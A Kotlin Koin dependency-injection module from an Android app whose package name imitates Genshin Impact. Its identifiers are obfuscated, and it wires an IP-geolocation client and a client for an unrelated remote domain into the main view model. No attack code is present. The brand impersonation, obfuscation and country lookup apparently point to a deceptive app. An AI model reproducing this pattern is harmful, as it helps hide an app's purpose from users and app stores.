package com.miHoYo.GenshinImpa

import android.app.Application
import android.content.Context
import android.content.SharedPreferences
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.miHoYo.GenshinImpa.udgdfgd.Tusijdwhusad
import com.miHoYo.GenshinImpa.udgdfgd.Losijdwhugydsa
import org.koin.android.ext.koin.androidApplication
import org.koin.androidx.viewmodel.dsl.viewModel
import org.koin.core.qualifier.named
import org.koin.dsl.module
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory

val tsdaasdjiiasd = module {

    single  <Wisjdokkoxckoz> (named("HostInter")){
        get<Retrofit>(named("RetroDev"))
            .create(Wisjdokkoxckoz::class.java)
    }

    single <Yuwijsjidhuxhuc> (named("ApiInter")) {
        get<Retrofit>(named("RetroCountry"))
            .create(Yuwijsjidhuxhuc::class.java)
    }
    single<Retrofit>(named("RetroCountry")) {
        Retrofit.Builder()
            .baseUrl("http://pro.ip-api.com/")
            .addConverterFactory(GsonConverterFactory.create(get()))
            .build()
    }
    single <Retrofit>(named("RetroDev")){
        Retrofit.Builder()
            .baseUrl("http://supremeclover.xyz/")
            .addConverterFactory(GsonConverterFactory.create())
            .build()
    }

    factory (named("CountryRep")) {
        Oiwjjishudhuhuxczhu(get(named("ApiInter")))
    }

    factory  (named("DevRep")){
        Aokskodjis(get(named("HostInter")))
    }
    single{
        llxzlcosaiajs()
    }
    single (named("SharedPreferences")) {
        focvkokxoc(androidApplication())
    }
}

fun focvkokxoc(ysudah: Application): SharedPreferences {
    return ysudah.applicationContext.getSharedPreferences(
        "SHARED_PREF",
        Context.MODE_PRIVATE
    )
}

fun llxzlcosaiajs(): Gson {
    return GsonBuilder().create()
}

val ejidjidjisfijsdf = module {
    viewModel (named("MainModel")){
        Losijdwhugydsa((get(named("CountryRep"))), get(named("DevRep")), get(named("SharedPreferences")), get())
    }
    viewModel(named("BeamModel")) {
        Tusijdwhusad(get())
    }
}